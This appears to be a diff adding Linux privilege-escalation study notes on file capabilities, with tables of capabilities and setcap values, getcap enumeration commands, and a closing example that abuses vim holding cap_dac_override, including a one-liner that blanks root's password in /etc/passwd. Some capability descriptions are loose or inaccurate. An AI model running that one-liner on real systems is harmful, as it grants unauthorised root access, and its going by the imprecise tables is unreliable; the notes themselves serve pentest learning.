@@ -93,6 +93,46 @@ sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic
 
 Some useful capabilities are:
 
-| Capability | Description |
-| ---------- | ----------- |
-| `cap_`     |             |
+| Capability             | Description                                                                                                                                                   |
+| ---------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| `cap_sys_admin`        | Perform admin actions such as **modifying system files or system settings**                                                                                   |
+| `cap_sys_chroot`       | Change the root directory for the current process, **access files and directories**                                                                           |
+| `cap_sys_ptrace`       | Can attach to and debug other processes, potentially allowing for the **interception of sensitive information or modify the behaviour of the other process**. |
+| `cap_sys_nice`         | Raise or lower the priority of processes, **could gain access to resources that were restricted**                                                             |
+| `cap_sys_time`         | Can modify system clock, potentially allowing it to **manipulate timestamps or cause other processes to behave in unexpected ways**                           |
+| `cap_sys_resource`     | Can modify system resource limits, such as max open file descriptors, or max memory allocation                                                                |
+| `cap_sys_module`       | Allows for loading and unloading kernel modules, potentially allowing **modification of OS behaviours or revealing sensitive information**                    |
+| `cap_net_bind_service` | Allows binding to network ports, potentially allowing it to **gain access to sensitive information or perform unauthorised actions**                          |
+| `cap_setuid`           | Allows a process to set its effective user ID, this includes `root`                                                                                           |
+| `cap_setgid`           | Allows the process to set its effective group ID, this includes the `root` group                                                                              |
+| `cap_dac_override`     | Allows bypassing of file read, write, and execute permission checks                                                                                           |
+When setting values with `setcap` we need to specify the capability as well as the value to set it too
+
+| Capability Values | Description                                                                                                                                                                                                                                                      |
+| ----------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| `=`               | Sets the specified capability for the executable but does not grant any privileges. This can be used to clear a previously set capability.                                                                                                                       |
+| `+ep`             | Grants the effective and permitted privileges. This allows for the privileges the capability allows but not any others. The effective privilege grants them immediately, this is useful for applications that are not "capability-aware" and do not self-manage. |
+| `+ei`             | Grants sufficient and inheritable privileges for the capability. This allows actions the capability allows but also allows any child processes to inherit the capability.                                                                                        |
+| `+p`              | Grants the permitted privileges for the capability. Allows actions the capability allows but does not allow other actions.                                                                                                                                       |
+Capabilities can be enumerated with:
+```bash
+getcap [binary]
+```
+```bash
+find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
+```
+> Tools like [LinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) will do this automatically
+
+If we found a binary such as `vim` that has the `cap_dac_override=eip` capability, we could use it to modify a system file:
+```bash
+$ getcap /usr/bin/vim.basic
+
+/usr/bin/vim.basic cap_dac_override=eip
+
+$ /usr/bin/vim.basic /etc/passwd
+```
+(*This can also be done in a non-interactive way*)
+```bash
+echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
+```
+> This removes the password field making it so root has no password.
